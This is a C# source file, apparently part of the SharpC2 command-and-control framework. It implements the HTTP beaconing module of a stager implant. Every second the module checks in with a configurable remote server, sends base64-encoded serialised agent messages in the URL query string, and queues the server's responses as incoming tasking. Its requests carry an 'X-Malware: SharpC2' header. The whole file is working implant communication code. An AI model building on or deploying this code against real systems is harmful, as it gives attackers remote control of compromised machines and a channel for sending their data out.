using Shared.Models;
using Shared.Utilities;

using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace Stager.Comms
{
    public class HTTPCommModule : CommModule
    {
        string AgentID;
        string ConnectAddress;
        int ConnectPort;

        public HTTPCommModule(string AgentID, string ConnectAddress, int ConnectPort)
        {
            this.AgentID = AgentID;
            this.ConnectAddress = ConnectAddress;
            this.ConnectPort = ConnectPort;
        }

        public override void Start()
        {
            Status = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (Status == ModuleStatus.Running)
                {
                    Checkin();
                    Thread.Sleep(1000);
                }
            });
        }

        void Checkin()
        {
            AgentMessage message;

            if (Outbound.Count > 0)
            {
                message = Outbound.Dequeue();
            }
            else
            {
                message = new AgentMessage
                {
                    AgentID = AgentID
                };
            }

            var serialised = Utilities.SerialiseData(message);
            var uri = new Uri(string.Format("/?data={0}", Convert.ToBase64String(serialised)), UriKind.Relative);

            var client = NewClient();
            client.DownloadDataAsync(uri);
        }

        WebClient NewClient()
        {
            var client = new WebClient();

            client.BaseAddress = $"http://{ConnectAddress}:{ConnectPort}";
            client.Headers.Clear();
            client.Headers.Add("X-Malware", "SharpC2");

            client.DownloadDataCompleted += WebClient_DownloadDataCompleted;

            return client;
        }

        void WebClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            try
            {
                if (e.Result.Length > 0)
                {
                    var message = Utilities.DeserialiseData<AgentMessage>(e.Result);

                    if (message != null)
                    {
                        Inbound.Enqueue(message);
                    }
                }
            }
            catch
            {

            }
        }
    }
}